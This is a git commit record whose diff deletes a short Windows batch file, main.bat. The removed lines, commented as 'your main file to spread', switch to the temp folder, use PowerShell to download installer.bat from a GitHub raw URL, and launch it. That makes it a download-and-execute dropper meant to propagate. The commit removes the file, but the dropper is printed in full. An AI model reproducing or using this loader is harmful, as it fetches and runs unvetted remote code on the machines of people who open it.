2e4cfb131086db04ab59fc07b1c5ae332e0734a1
Rudyx77 <103567044+Rudyx77@users.noreply.github.com>
2023-12-03 12:09:46 +0100

    Delete main.bat

--- main.bat
+++
@@ -1,5 +0,0 @@
-REM - This is your main file to spread.
-
-cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Rudyx77/my_powershell_script/main/installer.bat' -OutFile installer.bat"
-start installer.bat
